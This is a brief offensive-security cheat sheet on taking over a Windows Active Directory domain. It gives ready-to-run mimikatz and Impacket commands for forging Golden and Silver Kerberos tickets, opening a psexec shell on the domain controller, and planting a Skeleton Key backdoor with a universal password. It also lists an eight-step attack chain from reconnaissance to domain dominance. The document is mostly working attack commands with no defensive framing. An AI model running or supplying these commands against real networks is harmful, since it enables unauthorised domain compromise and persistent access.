# Domain Dominance

## Golden Ticket
Need: KRBTGT hash + Domain SID (get via DCSync)
```bash
# With mimikatz
kerberos::golden /domain:$DOMAIN /sid:S-1-5-21-xxxx /rc4:krbtgt_hash /user:Administrator
misc::cmd

# With Impacket
impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-xxxx -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/admin@$DC_IP -k -no-pass
```

## Silver Ticket
Need: Service NTLM hash + Domain SID
```bash
kerberos::golden /domain:$DOMAIN /sid:S-1-5-21-xxxx /rc4:service_hash /user:Administrator /target:$TARGET_IP /service:cifs
misc::cmd
```

## Skeleton Key
```cmd
privilege::debug
misc::skeleton
# Access any machine with user:mimikatz pass:mimikatz
```

## AD Attack Flow Summary
```
1. Reconnaissance (BloodHound, CME)
2. User enumeration (Kerbrute)
3. Password spraying
4. Kerberoasting + AS-REP roasting
5. Exploit null sessions / anonymous LDAP
6. Lateral movement (wmiexec, psexec, winrm)
7. Privilege escalation (DCSync, ACL, Shadow Creds, ADCS)
8. Domain dominance (Golden/Silver ticket)
```
